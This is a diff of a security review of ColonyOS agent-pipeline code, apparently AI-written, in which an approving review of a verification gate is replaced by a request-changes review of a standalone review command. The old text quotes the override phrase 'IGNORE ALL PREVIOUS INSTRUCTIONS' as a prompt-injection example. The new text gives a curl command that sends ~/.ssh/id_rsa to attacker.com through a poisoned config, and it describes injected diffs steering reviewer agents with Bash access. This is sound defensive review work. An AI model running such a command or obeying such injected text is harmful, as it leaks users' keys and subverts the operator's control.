@@ -1,48 +1,39 @@
 # Review by Staff Security Engineer (Round 1)
 
-Here is my security review:
+Now I have a comprehensive view of the implementation. Let me produce my review.
 
 ---
 
-## Review: Staff Security Engineer — Post-Implement Verification Gate
+## Security Review: Standalone `colonyos review <branch>` Command
 
-### Completeness
+### Completeness Assessment
 
-All 29 functional requirements (FR-1 through FR-29) are implemented. All 7 task groups are marked complete. 238 tests pass. The `Phase.VERIFY` enum, `VerificationConfig` dataclass, `run_verify_loop()`, `_run_verify_command()`, `_build_verify_fix_prompt()`, verify_fix.md template, pipeline wiring, `_compute_next_phase()`, `_SKIP_MAP`, and `colonyos init` integration (both interactive and `--quick` auto-detection) are all present and tested.
+All major PRD functional requirements are implemented:
+- ✅ FR-1 through FR-6: CLI registration with all flags
+- ✅ FR-7 through FR-9: Branch validation with remote ref rejection
+- ✅ FR-10 through FR-13: Standalone review template, diff extraction with truncation
+- ✅ FR-14 through FR-17: Parallel persona reviews with correct tools
+- ✅ FR-18 through FR-21: Fix loop with standalone prompts
+- ✅ FR-22 through FR-24: Review artifacts with correct naming
+- ✅ FR-25: Decision gate
+- ✅ FR-26 through FR-29: Summary output and exit codes
+- ✅ FR-30 through FR-31: Budget enforcement
+- ✅ FR-32: No RunLog
 
-### Security Assessment
+All 358 tests pass. No linter issues observed.
 
-**1. `shell=True` subprocess execution (orchestrator.py:670-671)** — The `verify_command` is executed via `subprocess.run(cmd, shell=True, ...)`. This means the value from `.colonyos/config.yaml` is passed directly to a shell. However, as the PRD correctly notes, ColonyOS already runs Claude Code with `bypassPermissions` (agent.py), meaning the agent itself already has unrestricted shell access. The `verify_command` is set by the repo owner via config file or `colonyos init`, not by untrusted input. This is an **accepted risk** with appropriate documentation in the PRD non-goals.
+### Security-Specific Findings
 
-**2. Test output → LLM prompt injection surface (orchestrator.py:696-703)** — Test failure output is truncated to 4000 chars and injected directly into the system prompt via Python `.format()`. A malicious test suite could craft output that attempts to hijack the implement agent's instructions (e.g., "IGNORE ALL PREVIOUS INSTRUCTIONS..."). The 4000-char truncation limit provides a partial mitigation by bounding the injection surface, and the output is placed inside a fenced code block in `verify_fix.md` (lines 16-18: ````...```), which provides weak framing. This is a **low-severity concern** — the attacker would need control over test output in a repo where they already have code execution via the test suite itself. No action needed for v1, but worth noting.
-
-**3. No environment variable leakage** — The subprocess call does not pass `env=` parameter, so it inherits the parent process environment. This is standard behavior and consistent with how git subprocess calls work elsewhere in the codebase. The test output (which may contain env vars printed by a failing test) is logged in `PhaseResult.artifacts` and truncated, but run logs are stored in `.colonyos/runs/` which is gitignored. **Acceptable.**
-
-**4. Timeout enforcement (orchestrator.py:675, 681-682)** — `subprocess.TimeoutExpired` is properly caught and treated as a failure. Default timeout is 300s, configurable via `verify_timeout`. This prevents the pipeline from hanging on a stuck test suite. The timeout value is parsed as `int()` in `_parse_verification()` (config.py:121), but there's no upper bound validation — a user could set `verify_timeout: 999999`. **Low risk** since it's operator-configured.
-
-**5. Budget guard before retries (orchestrator.py:773-781)** — Budget enforcement correctly checks `cost_so_far` against `per_run` before each implement retry. Verify runs themselves are logged with `cost_usd=0.0` and don't count against budget. The retry count cap (`max_verify_retries`) provides a secondary defense. **Well implemented.**
-
-**6. No secrets in committed code** — Grep confirms no credentials, tokens, or API keys in the diff. The only sensitive-adjacent patterns are in instruction template boilerplate.
-
-**7. Config round-trip safety** — `save_config()` only writes the `verification:` section when `verify_command` is not None (config.py:210). `load_config()` defaults gracefully when the section is missing. YAML is loaded via `yaml.safe_load()`, preventing deserialization attacks. **Sound.**
-
-**8. Audit trail** — Every verification attempt is recorded as a `PhaseResult` with `phase=Phase.VERIFY`, exit code, and truncated test output in artifacts. Implement retries are logged as normal `Phase.IMPLEMENT` entries. The run log is saved after verification completes (orchestrator.py:1337). **Good observability for post-incident analysis.**
-
-### Quality Notes
-
-- Tests are comprehensive: 314 lines of dedicated verification tests (`test_verify.py`) plus integration tests in `test_orchestrator.py` and config/init tests.
-- No TODO/FIXME/HACK in production code.
-- Code follows existing patterns (dataclass config, instruction templates, budget guards).
-- The `_SKIP_MAP` correctly maps `"verify": {"plan", "implement"}` so resume re-runs the free verification subprocess.
-
----
-
-VERDICT: approve
+VERDICT: request-changes
 
 FINDINGS:
-- [src/colonyos/orchestrator.py:670]: `shell=True` on user-configured command — accepted risk per PRD non-goals, consistent with existing agent permissions model
-- [src/colonyos/orchestrator.py:696-703]: Test output injected into LLM prompt via `.format()` inside fenced code block — low-severity prompt injection surface bounded by 4000-char truncation; attacker already needs code execution in the repo
-- [src/colonyos/config.py:121]: No upper-bound validation on `verify_timeout` — operator-configured, low risk, but could add a ceiling (e.g., 3600s) in a future hardening pass
+- [src/colonyos/orchestrator.py:282]: **MEDIUM — `shell=True` in `_run_verify_command()`**: The `verify_command` is executed via `subprocess.run(cmd, shell=True)`. While this command comes from the local `.colonyos/config.yaml` (which the repo owner controls), it's still a shell injection surface. If a malicious actor submits a PR that modifies `.colonyos/config.yaml` to set `verify_command: "curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)"`, the next `colonyos run` would execute that. **Mitigation**: Document this trust boundary clearly; consider validating that `verify_command` only contains allowlisted patterns, or at minimum log a warning when the verify command changes between runs.
+- [src/colonyos/orchestrator.py:282]: **LOW — No output sanitization**: The verify command output (up to 4000 chars) is passed directly into an LLM prompt via `_build_verify_fix_prompt()`. While this is a standard pattern, adversarial test output could attempt prompt injection. This is a known limitation of agent-based systems, not specific to this PR.
+- [src/colonyos/orchestrator.py:840-870]: **INFO — `_validate_branch_exists` and `_get_branch_diff` use safe subprocess calls**: These correctly use list-form `subprocess.run()` (no `shell=True`) and use `--` to terminate git option parsing, preventing branch names from being interpreted as flags. Good practice.
+- [src/colonyos/instructions/review_standalone.md]: **INFO — Reviewers still have `Bash` tool access**: As noted in the PRD's open questions (Q2), reviewers get `["Read", "Glob", "Grep", "Bash"]`. The `Bash` tool in review context is not truly read-only — a malicious instruction template could instruct a reviewer agent to exfiltrate secrets or destroy data. This is explicitly deferred per the PRD but remains the #1 security concern for this feature.
+- [src/colonyos/cli.py]: **LOW — `_print_review_summary` doesn't pass `decision_verdict`**: The `review` CLI command calls `_print_review_summary(phase_results, reviewers, total_cost)` but never passes `decision_verdict`, so even when `--decide` is used, the decision verdict won't appear in the summary table. This is a functional bug, not a security issue.
+- [src/colonyos/init.py]: **LOW — `_detect_test_command` reads untrusted files**: The auto-detection reads `Makefile`, `package.json`, etc. from the repo to infer a test command. The detected command is then stored in config and later executed with `shell=True`. A malicious repo could have a `Makefile` with a `test:` target to get auto-detected, though the user confirms during `colonyos init`, which provides a human-in-the-loop gate.
+- [src/colonyos/orchestrator.py]: **INFO — No audit trail for standalone reviews**: Unlike the full pipeline (which has `RunLog`), standalone reviews have no persistent record of what the agent did, what tools it called, or what commands it ran. The only artifacts are the review markdown files. For a tool that runs arbitrary code in repos, this makes post-incident forensics difficult. This is a design limitation acknowledged by FR-32.
 
 SYNTHESIS:
-From a supply-chain security and least-privilege perspective, this implementation is sound for v1. The key security decision — running the verify command via `shell=True` without sandboxing — is explicitly justified: the agent already operates with unrestricted shell access, so sandboxing a user-configured test command would be security theater. The audit trail is good: every verify attempt and retry is logged with exit codes and truncated output in the run log. Budget enforcement provides defense-in-depth against runaway retries. The two minor findings (prompt injection via test output, unbounded timeout) are both low-severity given the threat model — the operator controls both the config and the test suite. All PRD requirements are met, all tasks complete, 238 tests pass, no secrets in code, no TODOs remain. Approved.
+From a supply chain security perspective, this implementation is **reasonably sound for v1** but has two systemic concerns that should be tracked. First, `shell=True` for `verify_command` is the most concrete attack surface — it's mitigated by the fact that config is local and user-confirmed, but a config-poisoning attack via a malicious PR is plausible. Second, the `Bash` tool in reviewer hands remains the biggest blast-radius concern for the standalone review feature — a prompt injection via crafted diff content could theoretically instruct a reviewer agent to execute arbitrary commands. Both are acknowledged as deferred in the PRD. The implementation itself follows good subprocess hygiene elsewhere (list-form args, `--` terminators), has proper budget guards to limit runaway costs, validates branches locally, and rejects remote refs. The functional bug where `--decide` verdict isn't printed in the summary table should be fixed before merge. **I'm requesting changes solely for the `decision_verdict` passthrough bug** — the security items are tracked deferrals, not blockers.
